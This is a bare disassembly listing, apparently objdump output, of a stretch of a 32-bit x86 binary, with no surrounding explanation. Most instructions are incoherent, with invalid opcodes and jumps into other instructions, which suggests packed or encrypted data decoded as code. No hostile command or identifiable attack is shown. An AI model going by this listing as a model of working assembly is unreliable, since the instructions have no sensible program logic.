  41b1e1:	mov    cl,BYTE PTR [edx+ecx*8]
  41b1e4:	mov    ebp,DWORD PTR [ecx-0x5b804508]
  41b1ea:	xor    ecx,DWORD PTR ds:0xffc1ee6c
  41b1f0:	and    DWORD PTR [eax+edi*8-0x4f2f9026],0xffffffd5
  41b1f8:	js     0x41b1a1
  41b1fa:	cld    
  41b1fb:	fist   WORD PTR ds:0x54dba2c0
  41b201:	jp     0x41b1fe
  41b203:	xor    edx,DWORD PTR [edx]
  41b205:	xor    ah,BYTE PTR [eax-0x7b]
  41b208:	call   0xa1b23198
  41b20d:	adc    BYTE PTR [ecx+eax*1],dh
  41b210:	into   
  41b211:	jb     0x41b20a
  41b213:	sub    ah,BYTE PTR ds:0x5246e095
  41b219:	xor    eax,0x7ea4a37d
  41b21e:	leave  
  41b21f:	adc    esp,esp
  41b221:	dec    edi
  41b222:	mov    ah,0xff
  41b224:	inc    edi
  41b225:	adc    ebx,esi
  41b227:	mov    ch,0x9b
  41b229:	and    eax,0x9802f966
  41b22e:	and    cl,BYTE PTR [ebx+0x50]
  41b231:	outs   dx,BYTE PTR ds:[esi]
  41b232:	mov    esp,0x3e171626
  41b237:	mov    bh,0x3e
  41b239:	call   0x56f469b4
  41b23e:	jb     0x41b245
  41b240:	(bad)  
	...
  41b2b1:	add    BYTE PTR [eax],al
  41b2b3:	add    bh,dh
  41b2b5:	pop    eax
  41b2b6:	test   al,0x13
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	repz (bad) 
  41b2bb:	cld    
  41b2bc:	cmp    ch,bh
  41b2be:	jl     0x41b2c7
  41b2c0:	fimul  WORD PTR [esi+0x25abed6d]
  41b2c6:	add    DWORD PTR [eax],eax
  41b2c8:	cmc    
  41b2c9:	add    BYTE PTR [eax],al
  41b2cb:	add    BYTE PTR [ebp-0x7e],bh
  41b2ce:	pop    ebx
  41b2cf:	cmp    ebx,0xbd7c3226
  41b2d5:	jecxz  0x41b2a4
  41b2d7:	push   esp
  41b2d8:	push   ecx
  41b2d9:	stos   DWORD PTR es:[edi],eax
  41b2da:	push   ecx
  41b2db:	and    ah,dl
  41b2dd:	inc    edi
  41b2de:	icebp  
  41b2df:	and    ecx,ebp
  41b2e1:	(bad)  
  41b2e2:	mul    dh
  41b2e4:	cmp    dh,BYTE PTR [ebp-0x43165b6a]
  41b2ea:	dec    esi
  41b2eb:	add    BYTE PTR [edx-0x74],0x36
  41b2ef:	push   esi
  41b2f0:	xchg   edi,eax
  41b2f1:	mov    edx,0x417d6005
  41b2f6:	cmp    esi,DWORD PTR [ecx-0xc]
  41b2f9:	enter  0x80ff,0x69
  41b2fd:	ret    0xd06
  41b300:	stos   BYTE PTR es:[edi],al
  41b301:	addr16 popa 
  41b303:	retf   
  41b304:	(bad)
  41b307:	addr16 leave 
  41b309:	rcl    DWORD PTR [esi+0x610e8362],0x1b
  41b310:	inc    ecx
  41b311:	stos   BYTE PTR es:[edi],al
  41b312:	adc    eax,0x767c4767
  41b317:	mov    BYTE PTR [eax],bl
  41b319:	xchg   ebx,eax
  41b31a:	push   ecx
  41b31b:	popf   
  41b31c:	mov    dh,0xeb
  41b31e:	and    bl,dh
  41b320:	out    0xdd,eax
  41b322:	dec    ebx
  41b323:	mov    esp,0x73566662
  41b328:	push   esp
  41b329:	test   eax,0x15c07bb9
  41b32e:	test   DWORD PTR [eax],eax
  41b330:	les    edi,FWORD PTR [ebp+0x5d]
  41b333:	ds icebp 
  41b335:	fcomp  QWORD PTR [eax-0x38]
  41b338:	cmp    ebx,DWORD PTR [esi+0x46]
  41b33b:	ins    BYTE PTR es:[edi],dx
  41b33c:	pushf  
  41b33d:	fcom   QWORD PTR [eax+0x0]
  41b340:	repz sub cl,BYTE PTR [edi+0x6f]
  41b344:	cmc    
  41b345:	cdq    
  41b346:	arpl   WORD PTR [edx+0x76],cx
  41b349:	rcl    DWORD PTR [ebp+0x43],1
  41b34c:	dec    esp
  41b34d:	out    dx,al
  41b34e:	push   edx
  41b34f:	out    dx,eax
  41b350:	xor    DWORD PTR [ecx-0x5d],esp
  41b353:	mov    esi,DWORD PTR [edi]
  41b355:	mov    dl,0x11
  41b357:	push   0xa37db60f
  41b35c:	int3   
  41b35d:	add    eax,0xfc497d70
  41b362:	jb     0x41b3d4
  41b364:	cli    
  41b365:	sti    
  41b366:	ror    DWORD PTR [esi],1
  41b368:	or     ebx,DWORD PTR [ebp+0x5134c55d]
  41b36e:	mov    al,ds:0x5bb70f6f
  41b373:	inc    eax
  41b374:	iret   
  41b375:	cmp    bl,BYTE PTR [ebp+0x54e54887]
  41b37b:	jno    0x41b3ca
  41b37d:	or     ch,BYTE PTR [ecx]
  41b37f:	fdiv   QWORD PTR [eax-0x40]
  41b382:	pop    ecx
  41b383:	pop    es
  41b384:	ficom  WORD PTR [ecx-0x66b55d71]
  41b38a:	and    BYTE PTR [edx+0x403c9b81],0x8e
  41b391:	popf   
  41b392:	es test al,0x1a
  41b395:	into   
  41b396:	nop
  41b397:	jno    0x41b40c
  41b399:	and    DWORD PTR [eax-0x5d],edi
  41b39c:	popa   
  41b39d:	repnz inc esi
  41b39f:	imul   ecx,ecx,0x1
  41b3a2:	dec    ecx
  41b3a3:	mov    ebx,0x2d0e5dda
  41b3a8:	(bad)  
  41b3aa:	xlat   BYTE PTR ds:[ebx]
  41b3ab:	(bad)  [esi+edx*4]
  41b3ae:	cdq    
  41b3af:	mov    dl,0xd9
  41b3b1:	lock add al,0x30
  41b3b4:	adc    eax,0xb08dfad0
  41b3b9:	scas   eax,DWORD PTR es:[edi]
  41b3ba:	or     BYTE PTR [eax-0x26],0x13
  41b3be:	xchg   edx,eax
  41b3bf:	add    DWORD PTR [eax+0x0],ebx
	...
  41b431:	add    BYTE PTR [eax],al
  41b433:	add    BYTE PTR [edi-0xf0307e],bh
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	cdq    
  41b441:	jae    0x41b456
  41b443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b444:	mov    al,ds:0xf5000126
  41b449:	add    BYTE PTR [eax],al
  41b44b:	add    bh,cl
  41b44d:	addr16 (bad) 
  41b44f:	je     0x41b407
  41b451:	pop    ebx
  41b452:	sti    
  41b453:	cmp    eax,DWORD PTR [ebx]
  41b455:	dec    esi
  41b456:	dec    edi
  41b457:	adc    edi,DWORD PTR [ecx]
  41b459:	pop    esi
  41b45a:	jbe    0x41b4ae
  41b45c:	in     eax,0xd8
  41b45e:	lea    eax,[ebp-0x12]
  41b461:	jb     0x41b45f
  41b463:	(bad)  
  41b464:	jo     0x41b414
  41b466:	mov    eax,0xf14de079
  41b46b:	push   0xe7c4a260
  41b470:	or     eax,0x3022eccd
  41b475:	popa   
  41b476:	lea    eax,[ecx-0x188dab16]
  41b47c:	add    DWORD PTR [edx+ebx*1-0x21f0ca64],ebx
  41b483:	mov    dh,0xb9
  41b485:	aad    0x99
  41b487:	cdq    
  41b488:	mov    ch,0x56
  41b48a:	je     0x41b464
  41b48c:	mov    bl,0x29
  41b48e:	in     al,dx
  41b48f:	scas   al,BYTE PTR es:[edi]
  41b490:	push   ss
  41b491:	mov    dl,0x78
  41b493:	dec    esp
  41b494:	mov    esp,0x27eb7895
  41b499:	mul    BYTE PTR [edx+0x15]
  41b49c:	inc    ecx
  41b49d:	mov    bh,0x7e
  41b49f:	scas   al,BYTE PTR es:[edi]
  41b4a0:	or     DWORD PTR [edx],ebp
  41b4a2:	sbb    eax,0xaeb13247
  41b4a7:	or     al,0x6b
  41b4a9:	cmp    BYTE PTR [esi],bh
  41b4ab:	bound  ebx,QWORD PTR ds:0xf137ec22
  41b4b1:	lahf   
  41b4b2:	mov    al,ds:0x88aa6f1e
  41b4b7:	adc    eax,0xb667dc07
  41b4bc:	repz mov dh,0x43
  41b4bf:	push   edx
  41b4c0:	xor    al,0xa8
  41b4c2:	aas    
  41b4c3:	sub    al,0x2e
  41b4c5:	mov    es,ecx
  41b4c7:	push   ecx
  41b4c8:	je     0x41b47d
  41b4ca:	nop
  41b4cb:	sbb    ch,BYTE PTR [eax+0x483adcac]
  41b4d1:	pop    ds
  41b4d2:	cmc    
  41b4d3:	std    
  41b4d4:	mov    ah,0x94
  41b4d6:	cwde   
  41b4d7:	cmp    eax,0x536cc224
  41b4dc:	ins    DWORD PTR es:[edi],dx
  41b4dd:	lods   al,BYTE PTR ds:[esi]
  41b4de:	or     DWORD PTR [edi-0x25],ebp
  41b4e1:	into   
  41b4e2:	jge    0x41b464
  41b4e4:	xchg   DWORD PTR ds:0x5a26686f,ecx
  41b4ea:	in     al,dx
  41b4eb:	cld    
  41b4ec:	xor    eax,0x7af08338
  41b4f1:	jnp    0x41b51d
  41b4f3:	jl     0x41b4eb
  41b4f5:	cmc    
  41b4f6:	and    al,0xcf
  41b4f8:	mov    edi,0x39ff329
  41b4fd:	adc    al,0xcf
  41b4ff:	fisub  WORD PTR [edi+0x2224cb08]
  41b505:	repz adc bl,BYTE PTR [ebx+0x9]
  41b509:	mov    edx,0xa4bece5
  41b50e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b50f:	scas   eax,DWORD PTR es:[edi]
  41b510:	xor    al,0xf2
  41b512:	mov    es,WORD PTR [edx]
  41b514:	fild   DWORD PTR [ebx]
  41b516:	cmp    eax,0xfe655088
  41b51b:	push   0x4f
  41b51d:	out    dx,eax
  41b51e:	or     ch,bh
  41b520:	or     eax,0x5e1c0be3
  41b525:	mov    esi,0x2b9fe6f0
  41b52a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b52b:	sahf   
  41b52c:	jns    0x41b579
  41b52e:	jb     0x41b52d
  41b530:	fst    QWORD PTR [eax+0x1dd8463e]
  41b536:	push   cs
  41b537:	jo     0x41b5b6
  41b539:	adc    DWORD PTR ds:0x807bb1ad,edx
  41b53f:	xor    eax,0x9a
	...
  41b5b4:	pop    esp
  41b5b5:	sub    al,BYTE PTR [ecx]
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x23
  41b5c1:	hlt    
  41b5c2:	sti    
  41b5c3:	pop    ebx
  41b5c4:	xchg   ebp,eax
  41b5c5:	daa    
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	cmc    
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    BYTE PTR [ebp+0x62bdff36],al
  41b5d1:	jmp    0x41b583
  41b5d3:	enter  0x9259,0xd6
  41b5d7:	sub    edi,DWORD PTR [ebp+0x377d1a37]
  41b5dd:	adc    ch,dl
  41b5df:	test   al,0x89
  41b5e1:	push   esi
  41b5e2:	(bad)  
  41b5e3:	loop   0x41b61a
  41b5e5:	aam    0x42
  41b5e7:	adc    BYTE PTR [ebx+0xf],cl
  41b5ea:	jne    0x41b65a
  41b5ec:	dec    esp
  41b5ed:	aad    0xe7
  41b5ef:	jb     0x41b5a5
  41b5f1:	and    al,0xc3
  41b5f3:	lea    esi,[ebx-0x22]
  41b5f6:	xchg   esp,eax
  41b5f7:	fsub   DWORD PTR [ebx+eiz*4]
  41b5fa:	pop    edx
  41b5fb:	in     al,0x1d
  41b5fd:	lock sbb eax,0xf0aac2ea
  41b603:	fisub  WORD PTR [edi+0x7c]
  41b606:	xor    esi,ecx
  41b608:	cli    
  41b609:	pushf  
  41b60a:	mov    bh,0xa6
  41b60c:	push   ecx
  41b60d:	and    eax,0xc19e345d
  41b612:	(bad)  
  41b613:	pop    ebp
  41b614:	sbb    esp,DWORD PTR [ebp-0x42]
  41b617:	jbe    0x41b5ab
  41b619:	repz mov edi,0x416d3b94
  41b61f:	sbb    dh,BYTE PTR [edx]
  41b621:	loop   0x41b60b
  41b623:	pop    edx
  41b624:	ja     0x41b5d3
  41b626:	jns    0x41b5da
  41b628:	push   esp
  41b629:	cs daa 
  41b62b:	outs   dx,BYTE PTR ds:[esi]
  41b62c:	test   al,0x32
  41b62e:	popa   
  41b62f:	ror    BYTE PTR [esi-0x9],cl
  41b632:	aas    
  41b633:	xlat   BYTE PTR ds:[ebx]
  41b634:	adc    ebx,DWORD PTR [ebp+0x6d4cbd00]
  41b63a:	and    BYTE PTR [edi-0x284489e1],dh
  41b640:	mov    esi,0x13aca95a
  41b645:	into   
  41b646:	pushf  
  41b647:	mov    bl,0xb2
  41b649:	mov    ds:0x66be19e1,al
  41b64e:	add    BYTE PTR [esp+ebp*2-0x1f9ed629],ch
  41b655:	and    ebx,esi
  41b657:	jle    0x41b650
  41b659:	test   bl,bh
  41b65b:	mov    ebp,0x3390fbcf
  41b660:	lods   eax,DWORD PTR ds:[esi]
  41b661:	test   eax,0xd118f3e8
  41b666:	xlat   BYTE PTR ds:[ebx]
  41b667:	test   al,0x87
  41b669:	(bad)
  41b66d:	mov    ecx,0x8a211169
  41b672:	jl     0x41b633
  41b674:	rcl    dh,0xd2
  41b677:	scas   al,BYTE PTR es:[edi]
  41b678:	mov    ds,WORD PTR ds:0xb6cc4129
  41b67e:	dec    eax
  41b67f:	cwde   
  41b680:	fcmovnu st,st(0)
  41b682:	ins    BYTE PTR es:[edi],dx
  41b683:	repnz xor al,0x80
  41b686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b687:	rol    DWORD PTR [ecx+0x50daaec5],0xe
  41b68e:	adc    bl,BYTE PTR [ecx+0x3b556104]
  41b694:	mov    ch,0xf7
  41b696:	imul   esp,DWORD PTR [edx-0x79],0xffffffd0
  41b69a:	lds    eax,FWORD PTR [ecx+esi*4-0x1]
  41b69e:	jae    0x41b690
  41b6a0:	pop    esi
  41b6a1:	pushf  
  41b6a2:	mov    cl,0x52
  41b6a4:	pop    edx
  41b6a5:	outs   dx,BYTE PTR ds:[esi]
  41b6a6:	or     ebx,esi
  41b6a8:	or     ebx,eax
  41b6aa:	or     al,0x98
  41b6ac:	(bad)  
  41b6ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6ae:	sti    
  41b6af:	lods   eax,DWORD PTR ds:[esi]
  41b6b0:	mov    dh,BYTE PTR [eax]
  41b6b2:	dec    esp
  41b6b3:	xchg   BYTE PTR [esi-0x162f42a5],dl
  41b6b9:	stc    
  41b6ba:	addr16 xchg ecx,eax
  41b6bc:	(bad)  
  41b6bd:	mov    ch,0xb5
  41b6bf:	xor    eax,0x57
	...
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [esi+ecx*8+0x21],dh
  41b743:	mov    eax,0x1288a
  41b748:	cmc    
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [eax-0x2b],al
  41b74e:	dec    edi
  41b74f:	dec    edx
  41b750:	cli    
  41b751:	jmp    0x24e8:0xc82c86e1
  41b758:	retf   
  41b759:	mov    ah,0x77
  41b75b:	xchg   edx,eax
  41b75c:	push   ebp
  41b75d:	test   BYTE PTR [ecx+0x3],0xe9
  41b761:	xor    eax,0xb8c0764e
  41b766:	lock pop edx
  41b768:	push   ecx
  41b769:	(bad)  
  41b76b:	out    dx,eax
  41b76c:	xlat   BYTE PTR ds:[ebx]
  41b76d:	retf   
  41b76e:	add    DWORD PTR ds:0x942ffb39,eax
  41b774:	dec    ebp
  41b776:	sbb    ebp,DWORD PTR [eax]
  41b778:	push   es
  41b779:	mov    al,0x4
  41b77b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b77c:	lea    eax,[edx-0x63]
  41b77f:	(bad)  
  41b780:	clc    
  41b781:	and    ebx,DWORD PTR [eax]
  41b783:	xchg   edx,eax
  41b784:	cmp    al,0x63
  41b786:	sub    dl,dl
  41b788:	mov    al,0x66
  41b78a:	push   ds
  41b78b:	mov    esp,0x9f819adc
  41b790:	or     esp,edx
  41b792:	jecxz  0x41b71e
  41b794:	or     eax,0xffb5b32d
  41b799:	into   
  41b79a:	adc    DWORD PTR [eax-0x2b23e855],ecx
  41b7a0:	loope  0x41b7a8
  41b7a2:	jae    0x41b817
  41b7a4:	mov    esp,edx
  41b7a6:	inc    esp
  41b7a7:	fadd   QWORD PTR [esi-0x39]
  41b7aa:	cmp    bl,BYTE PTR [ebp-0x3efeffbc]
  41b7b0:	sbb    eax,0x7d7360b6
  41b7b5:	xchg   ebx,eax
  41b7b6:	jnp    0x41b802
  41b7b8:	xchg   ecx,eax
  41b7b9:	rcr    BYTE PTR [esi],1
  41b7bb:	mulps  xmm7,xmm1
  41b7be:	mov    edx,0x539770a3
  41b7c3:	push   ebx
  41b7c4:	pop    ecx
  41b7c5:	pop    edx
  41b7c6:	push   edi
  41b7c7:	xor    bh,dh
  41b7c9:	(bad)  
  41b7ca:	cld    
  41b7cb:	xchg   edi,eax
  41b7cc:	or     ebx,DWORD PTR ds:0x84f37132
  41b7d2:	xchg   ecx,eax
  41b7d3:	mov    ds:0x70c590d,al
  41b7d8:	and    esi,edi
  41b7da:	sahf   
  41b7db:	inc    ebx
  41b7dc:	(bad)  
  41b7dd:	fnstenv [edi-0x22]
  41b7e0:	stos   BYTE PTR es:[edi],al
  41b7e1:	xchg   edx,edi
  41b7e3:	or     eax,0x2828ef64
  41b7e8:	fcmovnbe st,st(6)
  41b7ea:	loop   0x41b858
  41b7ec:	sbb    bl,cl
  41b7ee:	addr16 cmp ebx,ebp
  41b7f1:	test   BYTE PTR [eax],0xcf
  41b7f4:	in     eax,0xdc
  41b7f6:	sahf   
  41b7f7:	daa    
  41b7f8:	fadd   st(3),st
  41b7fa:	push   cs
  41b7fb:	jle    0x41b7a0
  41b7fd:	adc    edi,ecx
  41b7ff:	and    edi,ebx
  41b801:	ret    
  41b802:	and    eax,0xdc0d48da
  41b807:	inc    esp
  41b808:	add    BYTE PTR [edi+0x5e],0xa0
  41b80c:	mov    dh,0x6f
  41b80e:	(bad)  
  41b80f:	lods   eax,DWORD PTR ds:[esi]
  41b810:	cmc    
  41b811:	test   BYTE PTR [esi-0x7f],dh
  41b814:	mov    BYTE PTR [esi-0x62],0xb
  41b818:	retf   
  41b819:	or     ah,BYTE PTR [ebx]
  41b81b:	sbb    bl,BYTE PTR [ebx-0x6d]
  41b81e:	dec    edx
  41b81f:	out    0x45,eax
  41b821:	sbb    eax,0x1c84c71f
  41b826:	cmp    BYTE PTR [ebx],ch
  41b828:	xchg   BYTE PTR [edi-0x27a87791],cl
  41b82e:	(bad)  
  41b82f:	repnz cmp eax,0xd4e9ad23
  41b835:	mov    ds:0x8b5f8a9f,al
  41b83a:	sub    DWORD PTR [ebx-0x25],ebp
  41b83d:	cmp    dh,BYTE PTR ds:0x3287
	...
  41b8b3:	add    BYTE PTR ds:0xcf4a867e,dh
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	ret    0xbe7b
  41b8c3:	loop   0x41b944
  41b8c5:	sub    DWORD PTR [ecx],eax
  41b8c7:	add    ch,dh
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [esi],dh
  41b8cd:	div    dl
  41b8cf:	mul    DWORD PTR [edx]
  41b8d1:	outs   dx,DWORD PTR ds:[esi]
  41b8d2:	(bad)
  41b8d5:	call   0x9bc6:0x66b590ed
  41b8dc:	jne    0x41b948
  41b8de:	iret   
  41b8df:	leave  
  41b8e0:	imul   ebp,ebx,0x42
  41b8e3:	fwait
  41b8e4:	out    dx,al
  41b8e5:	jns    0x41b8e3
  41b8e7:	adc    eax,esp
  41b8e9:	xor    eax,0x2a00d37e
  41b8ee:	ds push edx
  41b8f0:	pop    edi
  41b8f1:	push   edx
  41b8f2:	in     eax,0xd
  41b8f4:	leave  
  41b8f5:	or     ebx,DWORD PTR [eax+0xdbea9cf]
  41b8fb:	call   0x4db321f1
  41b900:	add    DWORD PTR [esi-0x5076479],ebx
  41b906:	mov    al,0xad
  41b908:	div    BYTE PTR [eax-0x2f21dca9]
  41b90e:	sub    al,0xd0
  41b910:	ds xchg ecx,eax
  41b912:	in     al,0x36
  41b914:	(bad)  
  41b915:	stos   DWORD PTR es:[edi],eax
  41b916:	inc    ebp
  41b917:	jno    0x41b89b
  41b919:	sub    eax,0x5d455a71
  41b91e:	(bad)  
  41b91f:	dec    ebp
  41b920:	or     ch,dl
  41b922:	xchg   edx,eax
  41b923:	ins    DWORD PTR es:[edi],dx
  41b924:	rcl    DWORD PTR [eax],1
  41b926:	arpl   WORD PTR [edi+0x24cf8768],di
  41b92c:	shr    BYTE PTR [ebx+ebx*4],0x48
  41b930:	mov    ecx,0x813769c1
  41b935:	mov    bl,0x8d
  41b937:	pop    esi
  41b938:	cwde   
  41b939:	leave  
  41b93a:	call   0x5491dc8b
  41b93f:	arpl   WORD PTR [ecx+0x4a],bx
  41b942:	xchg   edi,eax
  41b943:	rcl    esi,0x8c
  41b946:	adc    al,0x46
  41b948:	push   esp
  41b949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b94a:	jbe    0x41b9c2
  41b94c:	jmp    0x41b943
  41b94e:	scas   al,BYTE PTR es:[edi]
  41b94f:	sbb    eax,0x2285fd8
  41b954:	enter  0x31a0,0x9a
  41b958:	rcl    DWORD PTR [ebp-0x25ebb882],1
  41b95e:	or     edx,DWORD PTR [edx]
  41b960:	sub    BYTE PTR [esi-0x7],dl
  41b963:	xor    cl,BYTE PTR [eax]
  41b965:	adc    al,0x3
  41b967:	(bad)  [ecx]
  41b969:	push   edi
  41b96a:	daa    
  41b96b:	push   0xbd1be9ed
  41b970:	mov    al,0x7a
  41b972:	fadd   QWORD PTR [edi+0x61e1414b]
  41b978:	aad    0xb8
  41b97a:	not    BYTE PTR [edi+0x2c867443]
  41b980:	jecxz  0x41b91f
  41b982:	xor    al,0xc6
  41b984:	stc    
  41b985:	inc    eax
  41b986:	shl    ecx,cl
  41b988:	retf   0x4c2
  41b98b:	ret    0xb8c9
  41b98e:	mov    al,0x53
  41b990:	add    BYTE PTR [eax+ebx*4],al
  41b993:	stos   DWORD PTR es:[edi],eax
  41b994:	iret   
  41b995:	outs   dx,DWORD PTR ds:[esi]
  41b996:	jne    0x41ba00
  41b998:	adc    ah,BYTE PTR [ecx-0x20d889e0]
  41b99e:	dec    ecx
  41b99f:	test   al,0x7f
  41b9a1:	cmp    BYTE PTR [edx],dh
  41b9a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9a4:	arpl   WORD PTR [ebx-0x4229a46d],dx
  41b9aa:	jae    0x41b9f0
  41b9ac:	mov    dl,0x9f
  41b9ae:	sbb    al,0xe0
  41b9b0:	jns    0x41b964
  41b9b2:	and    BYTE PTR ss:[edx],0x96
  41b9b6:	pop    edx
  41b9b7:	xor    eax,0x3ada8967
  41b9bc:	inc    ecx
  41b9bd:	(bad)  
  41b9bf:	ds aam 0x0
	...
  41ba32:	add    BYTE PTR [eax],al
  41ba34:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	dec    esp
  41ba41:	cmp    DWORD PTR [eax+ebx*4+0x12a74],esi
  41ba48:	cmc    
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [edx+0x37],dl
  41ba4e:	jp     0x41ba09
  41ba50:	dec    edi
  41ba51:	mov    dl,bl
  41ba53:	rol    DWORD PTR [ebp-0x3],1
  41ba56:	add    eax,0x77c59ff7
  41ba5b:	dec    ebp
  41ba5c:	hlt    
  41ba5d:	dec    edx
  41ba5e:	ret    0x163f
  41ba61:	push   esp
  41ba62:	xchg   esp,eax
  41ba63:	adc    al,0xd3
  41ba65:	or     BYTE PTR [edx],0xfa
  41ba68:	test   al,0x44
  41ba6a:	das    
  41ba6b:	xchg   esp,eax
  41ba6c:	push   edx
  41ba6d:	popf   
  41ba6e:	add    BYTE PTR [edx],0x91
  41ba71:	leave  
  41ba72:	fmul   st(4),st
  41ba74:	ja     0x41bae9
  41ba76:	mov    ds:0xc375eea4,eax
  41ba7b:	ins    BYTE PTR es:[edi],dx
  41ba7c:	in     al,0x9
  41ba7e:	mov    eax,DWORD PTR [edi-0x54]
  41ba81:	into   
  41ba82:	xor    BYTE PTR [ecx],0x6f
  41ba85:	mov    eax,0x6999750f
  41ba8a:	(bad)  
  41ba8b:	ret    0x73d4
  41ba8e:	and    al,BYTE PTR [esi+edx*8+0x19bf465d]
  41ba95:	loop   0x41ba9d
  41ba97:	mov    bh,0x49
  41ba99:	pop    ss
  41ba9a:	push   ds
  41ba9b:	xchg   ecx,eax
  41ba9c:	sbb    eax,0x9a9cbf79
  41baa1:	cmp    edi,esi
  41baa3:	mov    eax,ds:0x89a9976a
  41baa8:	mov    edi,0x119c3100
  41baad:	sbb    bh,BYTE PTR [eax+0x1e]
  41bab0:	adc    esp,DWORD PTR [eax+ebx*2+0x4096d893]
  41bab7:	xchg   DWORD PTR [esi+0x1e],edi
  41baba:	in     eax,0x8d
  41babc:	and    ebx,ebx
  41babe:	loop   0x41ba76
  41bac0:	sbb    al,0x36
  41bac2:	test   DWORD PTR [eax-0x18],edi
  41bac5:	icebp  
  41bac6:	cli    
  41bac7:	aas    
  41bac8:	mov    ebp,0xcaa25a60
  41bacd:	xchg   esp,eax
  41bace:	cld    
  41bacf:	(bad)  
  41bad0:	xor    BYTE PTR [edi+edi*2+0x43],0xc1
  41bad5:	(bad)  
  41bad6:	into   
  41bad7:	mov    ah,0x2d
  41bad9:	shr    DWORD PTR [edi],1
  41badb:	(bad)
  41badf:	push   edx
  41bae0:	or     cl,BYTE PTR [edi+ebp*4]
  41bae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae4:	fst    st(0)
  41bae6:	inc    esi
  41bae7:	hlt    
  41bae8:	call   0x8fca3cf6
  41baed:	push   cs
  41baee:	pop    edx
  41baef:	push   eax
  41baf0:	fild   WORD PTR [edx]
  41baf2:	ja     0x41baad
  41baf4:	fstp   QWORD PTR [edi-0x1eafb890]
  41bafa:	(bad)  
  41bafb:	in     al,0xcb
  41bafd:	rcl    BYTE PTR [esi+0x3],1
  41bb00:	cmp    ch,BYTE PTR [edi-0x6c]
  41bb03:	scas   eax,DWORD PTR es:[edi]
  41bb04:	jo     0x41ba9c
  41bb06:	mov    ch,0x88
  41bb08:	inc    ecx
  41bb09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0a:	fdivp  st(2),st
  41bb0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb0d:	dec    esp
  41bb0e:	xchg   ecx,eax
  41bb0f:	ins    BYTE PTR es:[edi],dx
  41bb10:	outs   dx,DWORD PTR ds:[esi]
  41bb11:	data16 je 0x41bb4f
  41bb14:	pop    esp
  41bb15:	or     eax,0xaa8039a9
  41bb1a:	shl    BYTE PTR [eax-0x6a],0xc2
  41bb1e:	loop   0x41bb24
  41bb20:	in     eax,dx
  41bb21:	mov    eax,cs:0x4719279e
  41bb27:	fcomp  QWORD PTR [edx]
  41bb29:	cmp    al,0xb0
  41bb2b:	pop    es
  41bb2c:	(bad)  
  41bb2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb2e:	push   esp
  41bb2f:	or     BYTE PTR [esi-0x145aa244],dl
  41bb35:	cmp    BYTE PTR [ecx+0x5d],bh
  41bb38:	adc    eax,0x9e6715a5
  41bb3d:	adc    eax,0x96eb59
	...
  41bbb2:	add    BYTE PTR [eax],al
  41bbb4:	push   0x49
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	or     eax,0x69f4540d
  41bbc5:	sub    eax,DWORD PTR [ecx]
  41bbc7:	add    ch,dh
  41bbc9:	add    BYTE PTR [eax],al
  41bbcb:	add    ah,bh
  41bbcd:	aaa    
  41bbce:	in     eax,0x52
  41bbd0:	fistp  DWORD PTR [eax]
  41bbd2:	dec    edi
  41bbd3:	xchg   esi,eax
  41bbd4:	pop    edi
  41bbd5:	es ds in ax,dx
  41bbd9:	dec    ebx
  41bbda:	jae    0x41bba2
  41bbdc:	add    al,al
  41bbde:	lea    edi,[ebp+0x659a6e69]
  41bbe4:	call   0x2507c8e3
  41bbe9:	inc    edx
  41bbea:	sbb    BYTE PTR [eax+0x71dd107d],ah
  41bbf0:	repz imul BYTE PTR [ecx+0x37dcd147]
  41bbf7:	adc    eax,0xb02513e0
  41bbfc:	test   DWORD PTR [edi],edx
  41bbfe:	cwde   
  41bbff:	or     BYTE PTR [edi],cl
  41bc01:	sub    DWORD PTR [ebp+0x707dfffd],esp
  41bc07:	push   ebp
  41bc08:	jl     0x41bc28
  41bc0a:	fisttp WORD PTR [ecx]
  41bc0c:	pop    ds
  41bc0d:	and    DWORD PTR [edx+0x2c],edx
  41bc10:	xchg   edx,eax
  41bc11:	mov    al,0x3
  41bc13:	sub    eax,0x768c2757
  41bc18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc19:	or     ch,BYTE PTR [edx+0x40]
  41bc1c:	dec    ebp
  41bc1d:	stc    
  41bc1e:	fdivr  QWORD PTR [ecx+esi*2]
  41bc21:	lahf   
  41bc22:	daa    
  41bc23:	adc    DWORD PTR [ebp-0x315a4933],0xffffffe1
  41bc2a:	or     eax,0x2fdbfaba
